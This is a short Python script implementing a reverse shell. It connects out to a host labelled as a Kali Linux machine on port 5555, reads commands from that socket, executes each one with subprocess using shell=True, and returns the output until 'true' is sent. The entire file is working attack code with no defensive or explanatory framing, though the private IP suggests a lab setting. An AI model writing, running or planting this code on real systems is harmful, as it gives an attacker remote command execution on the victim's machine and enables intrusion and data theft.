import socket
import subprocess

stop_connection = "false"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 5555)) #kali linux ip
s.send(b"You are connected.\n")
s.send(b"Enter 'true' to stop connection.\n")

while stop_connection != b"true\n": # stops connection
   s.send(b"Enter your command: ")
   data_received = s.recv(1024)
   end_result = subprocess.check_output(data_received, shell = True)
   stop_connection = data_received
   s.send(end_result)
s.close()